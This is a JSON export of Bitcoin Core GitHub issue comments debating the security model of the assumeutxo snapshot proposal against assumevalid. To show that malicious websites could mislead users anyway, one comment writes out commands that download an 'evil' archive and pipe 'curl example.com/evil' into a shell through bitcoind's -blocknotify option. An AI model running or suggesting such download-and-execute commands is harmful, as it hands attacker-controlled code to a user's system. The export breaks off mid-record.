[
   {
      "author_association" : "MEMBER",
      "body" : "I think this is materially different from `-assumevalid`, because there are additional safety features built into assumevalid that are not possible (as of now) for assumeutxo: assumevalid must be a block hash in a headers chain that has overall valid POW and is covered in two weeks worth of POW on top of the assumevalid block. Also, all utxo operations (adding and removing coins) before assumevalid must be fully valid except for the script check, which is optionally skipped. So you couldn't create coins out of thin air with assumevalid.\r\nassumeutxo does not have those \"belt and suspenders\". So if an assumeutxo hash is put into the code base (after review), it must not be possible for a user to simply pass in (either by mistake or consciously) their own hash via command line argument or otherwise.",
      "created_at" : "2019-03-15T14:13:49Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-473301621",
      "id" : 473301621,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDQ3MzMwMTYyMQ==",
      "updated_at" : "2019-03-15T14:13:49Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/473301621",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "Concept NACK, this significantly changes Bitcoin's security model.",
      "created_at" : "2019-03-15T18:04:53Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-473388317",
      "id" : 473388317,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDQ3MzM4ODMxNw==",
      "updated_at" : "2019-03-15T18:04:53Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/473388317",
      "user" : {
         "avatar_url" : "https://avatars2.githubusercontent.com/u/1095675?v=4",
         "events_url" : "https://api.github.com/users/luke-jr/events{/privacy}",
         "followers_url" : "https://api.github.com/users/luke-jr/followers",
         "following_url" : "https://api.github.com/users/luke-jr/following{/other_user}",
         "gists_url" : "https://api.github.com/users/luke-jr/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/luke-jr",
         "id" : 1095675,
         "login" : "luke-jr",
         "node_id" : "MDQ6VXNlcjEwOTU2NzU=",
         "organizations_url" : "https://api.github.com/users/luke-jr/orgs",
         "received_events_url" : "https://api.github.com/users/luke-jr/received_events",
         "repos_url" : "https://api.github.com/users/luke-jr/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/luke-jr/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/luke-jr/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/luke-jr"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "> additional safety features built into assumevalid that are not possible (as of now) for assumeutxo: assumevalid must be a block hash in a headers chain that has overall valid POW and is covered in two weeks worth of POW on top of the assumevalid block.\r\n\r\nI don't see why this isn't possible for assumeutxo? You would include the tip block hash in the data hashed for assumeutxo, and the UTXO set you receive would need to include that hash (stating which block it is for). If the resulting hash isn't sufficiently deeply buried in the headers chain, you reject it.\r\n\r\n> So you couldn't create coins out of thin air with assumevalid.\r\n\r\nWith assumeutxo you can still have an inflation check (because the total accumulated subsidy is known for each height), so I don't think there is a difference. The only failure an invalid assumeutxo could lead to is incorrectly assigning coins, but the same is possible right now with an invalid assumevalid (which doesn't prevent theft).",
      "created_at" : "2019-03-15T19:11:20Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-473409039",
      "id" : 473409039,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDQ3MzQwOTAzOQ==",
      "updated_at" : "2019-03-15T19:23:34Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/473409039",
      "user" : {
         "avatar_url" : "https://avatars1.githubusercontent.com/u/548488?v=4",
         "events_url" : "https://api.github.com/users/sipa/events{/privacy}",
         "followers_url" : "https://api.github.com/users/sipa/followers",
         "following_url" : "https://api.github.com/users/sipa/following{/other_user}",
         "gists_url" : "https://api.github.com/users/sipa/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/sipa",
         "id" : 548488,
         "login" : "sipa",
         "node_id" : "MDQ6VXNlcjU0ODQ4OA==",
         "organizations_url" : "https://api.github.com/users/sipa/orgs",
         "received_events_url" : "https://api.github.com/users/sipa/received_events",
         "repos_url" : "https://api.github.com/users/sipa/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/sipa/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/sipa/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/sipa"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "> The only failure an invalid assumeutxo could lead to is incorrectly assigning coins, but the same is possible right now with an invalid assumevalid (which doesn't prevent theft).\r\n\r\nI think there's an argument to be made that convincing someone of an incorrect coin assignment is easier in assumeutxo because under assumevalid you'd have to reconstruct a valid series of blocks (with the accompanying PoW) after the bad coin assignment. In assumeutxo, if you can convince someone to accept a malicious hash, all the attacker has to do is serialize their modified set with no concern for alternate PoW construction. You wouldn't find out about this until the background validation process catches up to the block where the incorrect assignment happened.",
      "created_at" : "2019-03-16T22:39:13Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-473598461",
      "id" : 473598461,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDQ3MzU5ODQ2MQ==",
      "updated_at" : "2019-03-16T22:39:13Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/473598461",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/73197?v=4",
         "events_url" : "https://api.github.com/users/jamesob/events{/privacy}",
         "followers_url" : "https://api.github.com/users/jamesob/followers",
         "following_url" : "https://api.github.com/users/jamesob/following{/other_user}",
         "gists_url" : "https://api.github.com/users/jamesob/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/jamesob",
         "id" : 73197,
         "login" : "jamesob",
         "node_id" : "MDQ6VXNlcjczMTk3",
         "organizations_url" : "https://api.github.com/users/jamesob/orgs",
         "received_events_url" : "https://api.github.com/users/jamesob/received_events",
         "repos_url" : "https://api.github.com/users/jamesob/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/jamesob/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/jamesob/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/jamesob"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "> I don't see why this isn't possible for assumeutxo?\r\n\r\nThe logic itself is possible to implement in the same fashion, but not the trust model (allowing users to set the hash to an arbitrary one on the command line). With \"out of thin air\" I meant \"without effort\" (other than telling the user on my website to set `-assumeutxo=myhash` and then download `myutxoset.dat`).\r\nThat is solved, if it is absolutely not possible for the user to set the hash.",
      "created_at" : "2019-03-17T21:32:53Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-473717094",
      "id" : 473717094,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDQ3MzcxNzA5NA==",
      "updated_at" : "2019-03-17T21:32:53Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/473717094",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "> With \"out of thin air\" I meant \"without effort\" (other than telling the user on my website to set -assumeutxo=myhash and then download myutxoset.dat).\r\n\r\n@MarcoFalke but can't the malicious party now just tell the user to `wget example.com/evilutxoset.tar.gz && tar xzf evilutxoset.tar.gz`?  Or, if they wanted to make it look like a bitcoind configuration option, `bitcoind -blocknotify \"curl example.com/evil | sh\"`.\r\n\r\nMaybe it'd be satisfactory to just give the option a name that better hints at the danger of using it with an untrusted source, e.g. `-trustedutxo` or `-balance-snapshot-you-trust`.",
      "created_at" : "2019-04-08T13:11:54Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-480825481",
      "id" : 480825481,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDQ4MDgyNTQ4MQ==",
      "updated_at" : "2019-04-08T13:11:54Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/480825481",
      "user" : {
         "avatar_url" : "https://avatars2.githubusercontent.com/u/61096?v=4",
         "events_url" : "https://api.github.com/users/harding/events{/privacy}",
         "followers_url" : "https://api.github.com/users/harding/followers",
         "following_url" : "https://api.github.com/users/harding/following{/other_user}",
         "gists_url" : "https://api.github.com/users/harding/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/harding",
         "id" : 61096,
         "login" : "harding",
         "node_id" : "MDQ6VXNlcjYxMDk2",
         "organizations_url" : "https://api.github.com/users/harding/orgs",
         "received_events_url" : "https://api.github.com/users/harding/received_events",
         "repos_url" : "https://api.github.com/users/harding/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/harding/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/harding/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/harding"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "Indeed they can. Though they might also encourage you to buy backdoored hardware. Generally Bitcoin Core assumes that the underlying architecture (hardware, filesystem, operating system, network sockets, ...) are not tampered with. There is nothing we can do to prevent that.\r\n\r\nHowever, if it comes to Bitcoin Core internals, we should not allow backdoors and footguns. For example allowing users to modify consensus settings on the command line (like block size, the utxo set, ...).\r\n\r\nFor regtest it could make sense to allow setting this to simplify testing.",
      "created_at" : "2019-04-10T16:27:35Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-481763095",
      "id" : 481763095,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDQ4MTc2MzA5NQ==",
      "updated_at" : "2019-04-10T16:27:35Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/481763095",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "I've created a draft proposal for assumeutxo here: https://github.com/jamesob/assumeutxo-docs/tree/2019-04-proposal/proposal\r\n\r\nIf anyone would like to leave inline comments, the associated PR is here: https://github.com/jamesob/assumeutxo-docs/pull/1",
      "created_at" : "2019-04-23T15:28:15Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-485852962",
      "id" : 485852962,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDQ4NTg1Mjk2Mg==",
      "updated_at" : "2019-04-23T15:28:15Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/485852962",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/73197?v=4",
         "events_url" : "https://api.github.com/users/jamesob/events{/privacy}",
         "followers_url" : "https://api.github.com/users/jamesob/followers",
         "following_url" : "https://api.github.com/users/jamesob/following{/other_user}",
         "gists_url" : "https://api.github.com/users/jamesob/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/jamesob",
         "id" : 73197,
         "login" : "jamesob",
         "node_id" : "MDQ6VXNlcjczMTk3",
         "organizations_url" : "https://api.github.com/users/jamesob/orgs",
         "received_events_url" : "https://api.github.com/users/jamesob/received_events",
         "repos_url" : "https://api.github.com/users/jamesob/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/jamesob/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/jamesob/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/jamesob"
      }
   },
   {
      "author_association" : "NONE",
      "body" : "I think James's proposal addresses many of the concerns that have been brought up. \r\n\r\nI think its worth noting that the solution to the \"one practical security difference\" in phase 1 or 2, is not resilient in an adversarial environment. This could be solved by having a client ask all of its connections to verify that the UTXO snapshot is correct, and if any one of its connections says the UTXO set isn't correct, the client would then the client would build the UTXO set from scratch. However, it would be easy for an attacker to force many or even most newly connecting clients to build it from scratch - which defeats the purpose of the upgrade (ie scalability). Assumevalid doesn't have this problems since verifying claims about chain validity is much easier than verifying claims about UTXO set validity. Phase 3 solves the problem in a much nicer way. \r\n\r\n> So you couldn't create coins out of thin air with assumevalid.\r\n> assumeutxo does not have those \"belt and suspenders\".\r\n\r\nEven if we allow the user enter a golden UTXO hash, I believe \r\n\r\n> if it comes to Bitcoin Core internals, we should not allow backdoors and footguns. For example allowing users to modify consensus settings on the command line\r\n\r\nI agree. And so does Pieter Wuille: \"[allowing [utxo snapshots] to be configured is even more scary (e.g. some website saying \"speed up your sync, start with this command line flag!\").](https://www.reddit.com/r/Bitcoin/comments/bt0yb3/hardcoded_utxo_checkpoints_are_an_enormous/eosxsbb?utm_source=share&utm_medium=web2x)\". If all 3 phases of jamesob's are implemented tho, allowing the user to input a UTXO snapshot would be safe, since the client could efficiently verify the truth of the claim and ignore it if its not true.",
      "created_at" : "2019-05-26T22:00:15Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-496034913",
      "id" : 496034913,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDQ5NjAzNDkxMw==",
      "updated_at" : "2019-06-03T05:24:15Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/496034913",
      "user" : {
         "avatar_url" : "https://avatars3.githubusercontent.com/u/149531?v=4",
         "events_url" : "https://api.github.com/users/fresheneesz/events{/privacy}",
         "followers_url" : "https://api.github.com/users/fresheneesz/followers",
         "following_url" : "https://api.github.com/users/fresheneesz/following{/other_user}",
         "gists_url" : "https://api.github.com/users/fresheneesz/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/fresheneesz",
         "id" : 149531,
         "login" : "fresheneesz",
         "node_id" : "MDQ6VXNlcjE0OTUzMQ==",
         "organizations_url" : "https://api.github.com/users/fresheneesz/orgs",
         "received_events_url" : "https://api.github.com/users/fresheneesz/received_events",
         "repos_url" : "https://api.github.com/users/fresheneesz/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/fresheneesz/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/fresheneesz/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/fresheneesz"
      }
   },
   {
      "author_association" : "NONE",
      "body" : "Does assumeutxo offer any benefits that just bootstrapping with BIP 157/158 Neutrino whilst IBD is being performed doesn't? I suppose this is a \"cleaner\" approach as you are not running and extra client/service but sounds likes anybody wanting to bootstrap say a mobile full node could do so today with a lightclient/fullnode hybrid",
      "created_at" : "2019-06-30T10:01:08Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-507023605",
      "id" : 507023605,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDUwNzAyMzYwNQ==",
      "updated_at" : "2019-06-30T10:01:08Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/507023605",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/6570295?v=4",
         "events_url" : "https://api.github.com/users/mandelmonkey/events{/privacy}",
         "followers_url" : "https://api.github.com/users/mandelmonkey/followers",
         "following_url" : "https://api.github.com/users/mandelmonkey/following{/other_user}",
         "gists_url" : "https://api.github.com/users/mandelmonkey/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/mandelmonkey",
         "id" : 6570295,
         "login" : "mandelmonkey",
         "node_id" : "MDQ6VXNlcjY1NzAyOTU=",
         "organizations_url" : "https://api.github.com/users/mandelmonkey/orgs",
         "received_events_url" : "https://api.github.com/users/mandelmonkey/received_events",
         "repos_url" : "https://api.github.com/users/mandelmonkey/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/mandelmonkey/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/mandelmonkey/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/mandelmonkey"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "> Does assumeutxo offer any benefits that just bootstrapping with BIP 157/158 Neutrino whilst IBD is being performed doesn't?\r\n\r\nblockfilters provide no means of bootstrapping your utxo set, so that you can start using all full node functionality (block/tx validation, block/tx propagation, ...) at the tip.",
      "created_at" : "2019-06-30T13:49:36Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-507037956",
      "id" : 507037956,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDUwNzAzNzk1Ng==",
      "updated_at" : "2019-06-30T13:49:36Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/507037956",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "author_association" : "NONE",
      "body" : "> > Does assumeutxo offer any benefits that just bootstrapping with BIP 157/158 Neutrino whilst IBD is being performed doesn't?\r\n> \r\n> blockfilters provide no means of bootstrapping your utxo set, so that you can start using all full node functionality (block/tx validation, block/tx propagation, ...) at the tip.\r\n\r\nthanks I meant that you have a lightclient running along side your fullnode, so you can use your wallet with the lightclient whilst your fullnode is performing IBD, once finished it switches over. assumeutxo is a cleaner option as explained [here](https://github.com/jamesob/assumeutxo-docs/tree/2019-04-proposal/proposal#instead-of-using-utxo-snapshots-that-we-have-to-store-and-send-around-why-not-just-have-bitcoin-start-in-spv-mode-using-eg--bip-157-and-do-initial-block-download-in-the-background), but I am thinking in terms of mobile wallets, where having to download X megabytes after being offline for a few days/weeks is slower than using blockfilters to sync.\r\n",
      "created_at" : "2019-06-30T14:05:17Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-507039053",
      "id" : 507039053,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDUwNzAzOTA1Mw==",
      "updated_at" : "2019-06-30T14:05:17Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/507039053",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/6570295?v=4",
         "events_url" : "https://api.github.com/users/mandelmonkey/events{/privacy}",
         "followers_url" : "https://api.github.com/users/mandelmonkey/followers",
         "following_url" : "https://api.github.com/users/mandelmonkey/following{/other_user}",
         "gists_url" : "https://api.github.com/users/mandelmonkey/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/mandelmonkey",
         "id" : 6570295,
         "login" : "mandelmonkey",
         "node_id" : "MDQ6VXNlcjY1NzAyOTU=",
         "organizations_url" : "https://api.github.com/users/mandelmonkey/orgs",
         "received_events_url" : "https://api.github.com/users/mandelmonkey/received_events",
         "repos_url" : "https://api.github.com/users/mandelmonkey/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/mandelmonkey/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/mandelmonkey/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/mandelmonkey"
      }
   },
   {
      "author_association" : "NONE",
      "body" : ">In assumeutxo, if you can convince someone to accept a malicious hash, all the attacker has to do is serialize their modified set with no concern for alternate PoW construction\r\n\r\n>If we agree this is a feature worth supporting, does the sequence of \"RPC commands -> hardcoded assumeutxo value, optional use, P2P distribution -> UTXO rolling set hash block header commitment\" make sense?\r\n\r\nCommitting hash of UTXO set to the blockchain can bring the same PoW check to UTXO snapshots. However it's probably still not equivalent to the current assumevalid situation. The hardcoded assumevalid block hash doesn't imply data availability, the burdensome blockchain downloading is actually validating data availability without trusting the developers who specified such hash. AFAIK data availability is the main reason why fraud proofs can't work.",
      "created_at" : "2020-12-28T14:04:10Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-751722918",
      "id" : 751722918,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDc1MTcyMjkxOA==",
      "performed_via_github_app" : null,
      "updated_at" : "2020-12-28T14:04:10Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/751722918",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/4075106?v=4",
         "events_url" : "https://api.github.com/users/andronoob/events{/privacy}",
         "followers_url" : "https://api.github.com/users/andronoob/followers",
         "following_url" : "https://api.github.com/users/andronoob/following{/other_user}",
         "gists_url" : "https://api.github.com/users/andronoob/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/andronoob",
         "id" : 4075106,
         "login" : "andronoob",
         "node_id" : "MDQ6VXNlcjQwNzUxMDY=",
         "organizations_url" : "https://api.github.com/users/andronoob/orgs",
         "received_events_url" : "https://api.github.com/users/andronoob/received_events",
         "repos_url" : "https://api.github.com/users/andronoob/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/andronoob/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/andronoob/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/andronoob"
      }
   },
   {
      "author_association" : "NONE",
      "body" : "However in reality I still wish such rolling UTXO set commitment (in consensus level) to happen, because people will still try to achieve the same UTXO snapshot goal in even less secure ways (like, downloading UTXO set from random websites to overwrite the entire chainstate subdirectory).",
      "created_at" : "2020-12-28T14:09:41Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-751724561",
      "id" : 751724561,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDc1MTcyNDU2MQ==",
      "performed_via_github_app" : null,
      "updated_at" : "2020-12-28T14:09:41Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/751724561",
      "user" : {
         "avatar_url" : "https://avatars0.githubusercontent.com/u/4075106?v=4",
         "events_url" : "https://api.github.com/users/andronoob/events{/privacy}",
         "followers_url" : "https://api.github.com/users/andronoob/followers",
         "following_url" : "https://api.github.com/users/andronoob/following{/other_user}",
         "gists_url" : "https://api.github.com/users/andronoob/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/andronoob",
         "id" : 4075106,
         "login" : "andronoob",
         "node_id" : "MDQ6VXNlcjQwNzUxMDY=",
         "organizations_url" : "https://api.github.com/users/andronoob/orgs",
         "received_events_url" : "https://api.github.com/users/andronoob/received_events",
         "repos_url" : "https://api.github.com/users/andronoob/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/andronoob/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/andronoob/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/andronoob"
      }
   },
   {
      "author_association" : "NONE",
      "body" : "> The hardcoded assumevalid block hash doesn't imply data availability\r\n\r\nData availability for used transaction outputs is unnecessary. Availability of UTXOs at the point of the assumevalid hash is necessary, and a node will not consider a blockchain valid without it. What data availability would not be validated that you think needs to be?\r\n\r\n> without trusting the developers who specified such hash\r\n\r\nI want to point out that you need not trust developers any more than normal with this - many many people will still be reviewing code changes, you still need to trust that distributers of the software aren't malicious (in a way that version validation eg validating GPG sig can't cover).",
      "created_at" : "2020-12-28T19:02:16Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-751830238",
      "id" : 751830238,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDc1MTgzMDIzOA==",
      "performed_via_github_app" : null,
      "updated_at" : "2020-12-28T19:02:16Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/751830238",
      "user" : {
         "avatar_url" : "https://avatars3.githubusercontent.com/u/149531?v=4",
         "events_url" : "https://api.github.com/users/fresheneesz/events{/privacy}",
         "followers_url" : "https://api.github.com/users/fresheneesz/followers",
         "following_url" : "https://api.github.com/users/fresheneesz/following{/other_user}",
         "gists_url" : "https://api.github.com/users/fresheneesz/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/fresheneesz",
         "id" : 149531,
         "login" : "fresheneesz",
         "node_id" : "MDQ6VXNlcjE0OTUzMQ==",
         "organizations_url" : "https://api.github.com/users/fresheneesz/orgs",
         "received_events_url" : "https://api.github.com/users/fresheneesz/received_events",
         "repos_url" : "https://api.github.com/users/fresheneesz/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/fresheneesz/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/fresheneesz/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/fresheneesz"
      }
   },
   {
      "author_association" : "NONE",
      "body" : "> Data availability for used transaction outputs is unnecessary. Availability of UTXOs at the point of the assumevalid hash is necessary, and a node will not consider a blockchain valid without it. What data availability would not be validated that you think needs to be?\n\nI didn't believe it either, until I learned the story of fraud proofs.\n\n> I want to point out that you need not trust developers any more than normal with this - many many people will still be reviewing code changes, you still need to trust that distributers of the software aren't malicious (in a way that version validation eg validating GPG sig can't cover).\n\nI was talking about committing UTXO hash into the blockchain, by the miners, rather than the current proposal (hard-coded) which trusts the developers just like assumevalid.",
      "created_at" : "2020-12-29T06:01:49Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/issues/15605#issuecomment-751958397",
      "id" : 751958397,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/15605",
      "node_id" : "MDEyOklzc3VlQ29tbWVudDc1MTk1ODM5Nw==",
      "performed_via_github_app" : null,
      "updated_at" : "2020-12-29T06:01:49Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/751958397",
      "user" : {
